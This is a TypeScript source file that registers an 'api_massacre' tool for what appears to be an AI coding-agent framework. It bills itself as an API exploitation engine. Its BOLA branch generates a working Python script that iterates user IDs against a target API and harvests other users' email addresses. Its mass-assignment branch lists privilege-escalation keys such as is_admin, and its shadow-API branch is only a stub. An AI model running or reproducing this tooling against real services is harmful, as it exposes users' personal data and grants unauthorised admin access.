export * as ApiMassacreTool from "./api-massacre"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"

export const name = "api_massacre"

export const Input = Schema.Struct({
  action: Schema.String.annotate({
    description: "Action: 'bola_scan' (Broken Object Level Authorization / IDOR mass exploitation), 'mass_assignment' (Fuzz JSON bodies for hidden admin parameters), 'shadow_api' (Discover unlinked v1/v2/beta endpoints).",
  }),
  target_api: Schema.String.annotate({
    description: "Base URL of the target API.",
  }),
  auth_token: Schema.String.pipe(Schema.optional).annotate({
    description: "Valid JWT or Bearer token for authenticated testing.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  script: Schema.String.pipe(Schema.optional),
})

type Output = typeof Output.Type

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Next-Gen API Exploitation Engine. Rips through microservices and REST/GraphQL backends. Automates the discovery and exploitation of BOLA/IDOR (Broken Object Level Authorization) across millions of IDs, fuzzes for Mass Assignment vulnerabilities (e.g., {"is_admin": true}), and maps Shadow APIs.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const action = input.action.toLowerCase()
              let script = ""
              let outputText = ""

              if (action === "bola_scan") {
                outputText = `# BOLA (Broken Object Level Authorization) / IDOR Exploitation\n\nTarget: ${input.target_api}\nImpact: Accessing or modifying data belonging to other users by automatically iterating UUIDs/Integers and analyzing authorization failures.`
                script = `#!/usr/bin/env python3
# Automated BOLA Hunter
import requests
import json

TARGET = "${input.target_api}"
TOKEN = "${input.auth_token || ""}"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

# Assume we observed /api/v1/users/1234/profile
# We will fuzz from 1000 to 2000

for user_id in range(1000, 2000):
    url = f"{TARGET}/users/{user_id}/profile"
    res = requests.get(url, headers=HEADERS)
    
    if res.status_code == 200:
        data = res.json()
        if "email" in data:
            print(f"[+] BOLA Found! User {user_id} - Email: {data['email']}")
`
              } else if (action === "mass_assignment") {
                outputText = `# Mass Assignment Exploitation\n\nImpact: Modifying object properties the developer didn't intend to expose (e.g., escalating privileges during account creation or update).`
                script = `# Fuzzing JSON bodies with common administrative keys:
# {"role": "admin", "role_id": 1, "is_admin": true, "permissions": ["all"], "tenant_id": 0}

# The engine automatically intercepts legitimate PUT/POST requests, appends these keys, and monitors for successful privilege escalation in the response.`
              } else {
                outputText = `Action ${action} logic framework generated.`
              }

              return { output: outputText, script: script }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "API Massacre failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/api-massacre",
  layer,
  deps: [ToolRegistry.node],
})
